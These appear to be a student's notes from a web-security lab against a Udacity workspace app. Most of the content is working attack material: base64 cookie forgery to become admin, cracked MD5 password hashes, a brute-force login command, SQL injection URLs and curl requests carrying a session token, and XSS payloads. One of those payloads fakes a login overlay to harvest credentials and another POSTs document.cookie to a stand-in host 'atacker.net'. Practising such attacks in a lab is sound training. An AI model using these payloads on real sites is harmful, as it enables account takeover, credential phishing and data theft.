# User Scalation

users/id/

customers/id/

user 1 - admin [1:user]
MTp1c2Vy

user 2 - user [2:user]
Mjp1c2Vy

admin 1 - admin [1:admin]
MTphZG1pbg==

## Hases

Set a breakpoint in getCustomer function at the `$('#customerID').val(data[0][0]);` and hover the data object. The fiveth position of the data array is the hash for that customer (e.g d8578edf8458ce06fbc5bb76a58c5ca4)

1. d8578edf8458ce06fbc5bb76a58c5ca4
   1. username: pdoe
   2. password: qwerty
2. 5f4dcc3b5aa765d61d8327deb882cf99
   1. username: jdoe
   2. password: password
3. e807f1fcf82d132f9bb018ca6738a19f
   1. username: ddoe
   2. password: 1234567890
4. 8621ffdbc5698829397d97767ac13db3
   1. username: mdoe
   2. password: dragon
5. df53ca268240ca76670c8566ee54568a
   1. username: ndoe
   2. password: computer

## Bruteforce

python bruteforce.py -U test-username.txt -P test-password.txt -d username=^USR^:password=^PWD^ -m POST -f "Login Failed" https://r1026361c1084570xjupyterlltj21rh6-3000.udacity-student-workspaces.com/login

## SQLi

'/**/or/**/1/**/=/**/'1

https://r1026361c1084570xjupyterlltj21rh6-3000.udacity-student-workspaces.com/customers/id/%00'/**/or/**/1=%00'1

## cURL

curl 'https://r1026361c1084570xjupyterlltj21rh6-3000.udacity-student-workspaces.com/customers/id/?_=1667563195075' \
 -H 'cookie: \_\_trust=hi; sg_route=spacegate-eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJkN2Y2ZGI0YS1hNjllLTExZWMtYWRjZi00NzQwMmQ2NjY3ODEiLCJpYXQiOjE2Njc1NjE5MTEsImV4cCI6MTY2NzYwNTExMSwiaXBfYWRkcmVzcyI6IjM0LjEyMy45Ni4yNTEiLCJzdGFyX2lkIjoianVweXRlcmxhYi1qbm5jZXFxaSJ9.fDw01HWDhd30sr2hcO8swtTeqCRVzHH9LoNmEQ1xATMaeCGW6Ax_05FQL-xYPyTahZJvgbnt34xKWmrFywBT2wLjv9g2Y7i5KCxnKUuD-LnhycLdCoUNJF9HYiMplf0fxxvlgEnccfFtLT33KBRjYCUn68NzlmL-m-4BJ_yufkV6xZOnwJlzNR4t2cZSyvlMt9muQ-1FUqUUDfBUEoUrHgnlMbMuWWa1-ebiD23G7TM_pY3yEgAA_8t99k1Cfy58Unpw9a1xEC-PZgQ70vIJkELiID3SkNciysuwxsOTAzkj65N-yJDXvWCN8VJzUOW3Pi0Gd2nsLEhwdmBoNuPsMg; authInfo=MTphZG1pbg=='

curl 'https://r1026361c1084570xjupyterlltj21rh6-3000.udacity-student-workspaces.com/customers/id/1'%20or%201%20=%20'1' \
 -H 'cookie: \_\_trust=hi; sg_route=spacegate-eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJkN2Y2ZGI0YS1hNjllLTExZWMtYWRjZi00NzQwMmQ2NjY3ODEiLCJpYXQiOjE2Njc1NjE5MTEsImV4cCI6MTY2NzYwNTExMSwiaXBfYWRkcmVzcyI6IjM0LjEyMy45Ni4yNTEiLCJzdGFyX2lkIjoianVweXRlcmxhYi1qbm5jZXFxaSJ9.fDw01HWDhd30sr2hcO8swtTeqCRVzHH9LoNmEQ1xATMaeCGW6Ax_05FQL-xYPyTahZJvgbnt34xKWmrFywBT2wLjv9g2Y7i5KCxnKUuD-LnhycLdCoUNJF9HYiMplf0fxxvlgEnccfFtLT33KBRjYCUn68NzlmL-m-4BJ_yufkV6xZOnwJlzNR4t2cZSyvlMt9muQ-1FUqUUDfBUEoUrHgnlMbMuWWa1-ebiD23G7TM_pY3yEgAA_8t99k1Cfy58Unpw9a1xEC-PZgQ70vIJkELiID3SkNciysuwxsOTAzkj65N-yJDXvWCN8VJzUOW3Pi0Gd2nsLEhwdmBoNuPsMg; authInfo=MTphZG1pbg=='

query Injection

https://r1026361c1084570xjupyterlltj21rh6-3000.udacity-student-workspaces.com/customers/id/2'%20or%201%20=%20'1

<script>
      const body = document.querySelector("body");
      const cookie = document.cookie;
      const url = "http://atacker.net";
      const sendCookie = function(){
            alert("Your cookie was sent to "+url+" with you current data: "+cookie)
      };
      const button = document.createElement("button");
      button.innerText = "Cookie Thief";
      button.setAttribute("id", "sendCookie");
      button.setAttribute("onclick", "sendCookie()");
      body.append(button);
</script>

<script>
      const url = "http://atacker.net";
      const cookie = document.cookie;
      const body = document.querySelector("body");
      /*backdrop*/
      const backdrop = document.createElement("div");
      backdrop.style.minHeight = "100%";
      backdrop.style.width = "100%";
      backdrop.style.backgroundColor = "white";
      backdrop.style.position = "fixed";
      backdrop.style.top = "0";
      backdrop.style.left = "0";
      backdrop.style.zIndex = "10000";
      body.append(backdrop);
      /*card*/
      const card = document.createElement("div");
      card.padding = "20px";
      /*username*/
      const username_label = document.createElement("label");
      username_label.innerText = "username:";
      card.append(username_label);
      const username = document.createElement("input");
      username.setAttribute("id", "username");
      card.append(username);
      /*password*/
      const password_label = document.createElement("label");
      password_label.innerText = "password:";
      card.append(password_label);
      const password = document.createElement("input");
      password.setAttribute("id", "password");
      password.setAttribute("type", "password");
      card.append(password);
      /*submit*/
      const submit = document.createElement("button");
      submit.setAttribute("id", "submit");
      submit.innerText = "Submit";
      const submitForm = function(){
            alert("Your credentials was sent to "+url+" with you current data: "+cookie)
      };
      submit.setAttribute("onclick", "submitForm()");
      card.append(submit);
      backdrop.append(card);
</script>


const body = document.querySelector("body");
const cookie = document.cookie;
const url = "http://atacker.net";
const sendCookie = function () {
  alert("Your cookie was sent to " + url + " with your current data: " + cookie);
};
const button = document.createElement("button");
button.innerText = "Upload Image";
button.setAttribute("id", "sendCookie");
button.setAttribute("onclick", "sendCookie()");
body.append(button);

<script>
const body = document.querySelector("#settings form .form-group .col-sm-offset-2");
const cookie = document.cookie;
const url = "http://atacker.net";
function sendCookie () {
  alert("Your cookie was sent to " + url + " with your current data: " + cookie);
  fetch("http://atacker.net",{method:"POST", body: JSON.stringify(cookie)}).then(data=>console.log("cookie", cookie));
};
const button = document.createElement("button");
button.innerText = "Upload Image";
button.setAttribute("id", "sendCookie");
button.setAttribute("type", "button");
button.setAttribute("class", "btn btn-primary");
button.onclick = sendCookie;
body.append(button);
</script>